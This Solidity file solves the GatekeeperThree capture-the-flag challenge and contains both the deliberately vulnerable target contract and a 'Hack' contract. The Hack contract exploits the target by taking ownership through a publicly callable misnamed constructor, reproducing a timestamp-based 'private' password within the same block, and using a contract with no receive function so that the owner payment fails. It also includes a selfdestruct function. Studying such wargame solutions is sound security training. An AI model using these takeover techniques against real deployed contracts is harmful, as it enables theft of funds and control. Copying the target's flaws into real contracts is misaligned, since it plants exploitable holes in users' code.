// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    GatekeeperThree private gate;

    constructor(address _target) payable {
        gate = GatekeeperThree(payable(_target));
    }

    function pwn() external {
        // pass gate-one
        gate.construct0r();

        // pass gate-three
        (bool ok, ) = address(gate).call{value: address(this).balance}("");
        require(ok, "gate.call fail");

        // pass gate-two
        gate.createTrick();
        uint256 timestamp = block.timestamp;
        gate.trick().checkPassword(timestamp);
        gate.getAllowance(timestamp);
        require(gate.allowEntrance(), "gate allowEntrace fail");

        gate.enter();
        require(gate.entrant() == msg.sender, "pwn fail");
    }

    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

// 0x14691adBef68C34dC52592030303cc458340b5A3
contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner, "gateone-1 fail");
        require(tx.origin != owner, "gateone-2 fail");
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true, "gatetwo fail");
        _;
    }

    modifier gateThree() {
        if (
            address(this).balance > 0.001 ether &&
            payable(owner).send(0.001 ether) == false
        ) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
